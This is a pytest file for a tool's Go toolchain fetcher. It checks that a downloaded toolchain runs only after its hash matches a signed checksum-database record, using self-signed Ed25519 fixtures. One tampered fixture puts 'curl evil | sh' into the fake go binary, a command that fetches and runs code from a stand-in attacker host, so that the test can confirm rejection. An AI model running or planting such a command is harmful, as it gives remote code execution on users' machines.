"""The Go toolchain tundravm fetches when the host has no ``go``: checked as ``go`` checks it."""

from __future__ import annotations

import base64
import hashlib
import io
import zipfile
from email.message import Message
from urllib.error import HTTPError, URLError

import pytest

from tundravm import _go_toolchain as go
from tundravm.errors import SourceError

NAME = "go1.25.0"
MODULE = f"golang.org/toolchain@v0.0.1-{NAME}.linux-amd64"
PATH, VERSION = MODULE.split("@")
FILES = {"bin/go": b"#!/bin/sh\n", "pkg/tool/linux_amd64/compile": b"c", "VERSION": b"go1.25.0"}
SEED = b"\x07" * 32


def _zip(files: dict[str, bytes]) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as archive:
        for rel, data in files.items():
            archive.writestr(f"{MODULE}/{rel}", data)
    return out.getvalue()


def _h1(files: dict[str, bytes]) -> str:
    """``dirhash.Hash1`` over the module zip's file list, written out."""
    lines = sorted(f"{MODULE}/{rel}" for rel in files)
    summary = "".join(
        f"{hashlib.sha256(files[name.removeprefix(MODULE + '/')]).hexdigest()}  {name}\n"
        for name in lines
    )
    return "h1:" + base64.b64encode(hashlib.sha256(summary.encode()).digest()).decode()


def _int(data: bytes) -> int:
    return int.from_bytes(data, "little")


def _sign(seed: bytes, message: bytes) -> tuple[bytes, bytes]:
    """``(public, signature)``: RFC 8032 Ed25519 with the private key *seed*."""
    h = hashlib.sha512(seed).digest()
    a = (_int(h[:32]) & ((1 << 254) - 8)) | (1 << 254)
    public = go.point_compress(go.point_mul(a, go.BASE))
    r = _int(hashlib.sha512(h[32:] + message).digest()) % go._L
    big_r = go.point_compress(go.point_mul(r, go.BASE))
    k = _int(hashlib.sha512(big_r + public + message).digest()) % go._L
    return public, big_r + ((r + k * a) % go._L).to_bytes(32, "little")


def _key(seed: bytes) -> str:
    public, _ = _sign(seed, b"")
    key = b"\x01" + public
    key_id = hashlib.sha256(b"sum.golang.org\n" + key).digest()[:4].hex()
    return f"sum.golang.org+{key_id}+{base64.b64encode(key).decode()}"


def _mth(leaves: list[bytes]) -> bytes:
    if len(leaves) == 1:
        return leaves[0]
    half = 1 << ((len(leaves) - 1).bit_length() - 1)
    return hashlib.sha256(b"\x01" + _mth(leaves[:half]) + _mth(leaves[half:])).digest()


def _record(h1: str) -> bytes:
    return f"{PATH} {VERSION} {h1}\n{PATH} {VERSION}/go.mod h1:mod=\n".encode()


def _served(
    files: dict[str, bytes], *, signer: bytes = SEED, claimed: dict[str, bytes] | None = None
) -> dict[str, bytes]:
    """The proxy serving *files* and a checksum database of three records whose second is
    :data:`FILES`'s, its head signed by *signer*; the lookup answers *claimed*'s record."""
    record = _record(_h1(FILES))
    records = [b"example.com/a v1.0.0 h1:a=\n", record, b"example.com/c v1.0.0 h1:c=\n"]
    leaves = [hashlib.sha256(b"\x00" + text).digest() for text in records]
    tree = f"go.sum database tree\n3\n{base64.b64encode(_mth(leaves)).decode()}\n".encode()
    _, signature = _sign(signer, tree)
    key_id = bytes.fromhex(_key(signer).split("+")[1])
    note = tree + b"\n\xe2\x80\x94 sum.golang.org " + base64.b64encode(key_id + signature)
    answer = record if claimed is None else _record(_h1(claimed))
    return {
        f"{go.SUMDB}/lookup/{MODULE}": b"1\n" + answer + b"\n" + note + b"\n",
        f"{go.SUMDB}/tile/8/0/000.p/3": b"".join(leaves),
        f"{go.GO_PROXY}/{PATH}/@v/{VERSION}.zip": _zip(files),
    }


TAMPERED = {**FILES, "bin/go": b"#!/bin/sh\ncurl evil | sh\n"}


@pytest.mark.parametrize(
    ("served", "refused"),
    [
        (_served(FILES), None),
        (_served(TAMPERED), "the zip hashes to h1:"),
        (_served(FILES, signer=b"\x09" * 32), "no valid signature by sum.golang.org"),
        (_served(TAMPERED, claimed=TAMPERED), "record is not the one its signed tree holds"),
        ({}, "cannot download it: no route to host"),
    ],
    ids=["verified", "hash-mismatch", "bad-signature", "record-not-in-tree", "unreachable"],
)
def test_a_fetched_go_runs_only_once_the_checksum_database_vouches_for_it(
    monkeypatch: pytest.MonkeyPatch, served: dict[str, bytes], refused: str | None
) -> None:
    """The proxy's zip must hash to the record the database's signed tree holds; anything
    else is refused with the fix and leaves nothing behind."""
    monkeypatch.setattr(go, "SUMDB_KEY", _key(SEED))
    monkeypatch.setattr("platform.machine", lambda: "x86_64")
    asked: list[str] = []

    def fetcher(url: str) -> bytes:
        asked.append(url)
        if not served:
            raise URLError("no route to host")
        if url not in served:
            raise HTTPError(url, 404, "Not Found", Message(), None)
        return served[url]

    root = go.toolchains_dir() / NAME
    if refused is not None:
        with pytest.raises(SourceError, match=refused) as failed:
            go.fetch_go(NAME, fetcher=fetcher)
        assert "sudo apt install golang" in str(failed.value.hint)
        assert "proxy.golang.org" in str(failed.value.hint)
        assert not go.toolchains_dir().exists() or not any(go.toolchains_dir().iterdir())
        return
    assert go.fetch_go(NAME, fetcher=fetcher) == root
    assert (root / "bin" / "go").read_bytes() == FILES["bin/go"]
    assert (root / "bin" / "go").stat().st_mode & 0o111
    assert (root / "pkg/tool/linux_amd64/compile").stat().st_mode & 0o111
    assert not (root / "VERSION").stat().st_mode & 0o111
    assert (root / go.VERIFIED).read_text(encoding="utf-8") == f"{_h1(FILES)}\n"
    fetched = len(asked)
    assert go.fetch_go(NAME, fetcher=fetcher) == root and len(asked) == fetched
